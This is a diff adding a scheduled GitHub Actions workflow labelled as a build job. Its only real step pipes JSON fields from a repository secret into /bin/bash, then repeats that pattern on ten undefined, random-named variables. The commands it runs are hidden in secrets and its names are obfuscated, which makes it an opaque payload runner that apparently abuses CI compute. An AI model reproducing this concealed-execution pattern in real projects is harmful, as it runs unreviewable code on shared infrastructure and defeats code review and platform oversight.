@@ -1,0 +1,28 @@
+name: xianzhenglingdang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianzhenglingdang
+        env:
+          pkwlc05: ${{ secrets.pkwlc05 }}
+        run: |
+          echo $pkwlc05 | jq -r .m0630 | /bin/bash
+          echo $ryxyf3 | jq -r .ykxp7823 | /bin/bash
+          echo $lsi5 | jq -r .c037 | /bin/bash
+          echo $q06261 | jq -r .hpcs58 | /bin/bash
+          echo $aob73 | jq -r .p5598 | /bin/bash
+          echo $gzpb36609 | jq -r .fn58 | /bin/bash
+          echo $xiqrb65518 | jq -r .v04673 | /bin/bash
+          echo $n27407 | jq -r .yaax39 | /bin/bash
+          echo $xn7 | jq -r .vnmhj086 | /bin/bash
+          echo $bdjp64790 | jq -r .vtlu5 | /bin/bash
+          echo $n1 | jq -r .nmll054 | /bin/bash
+
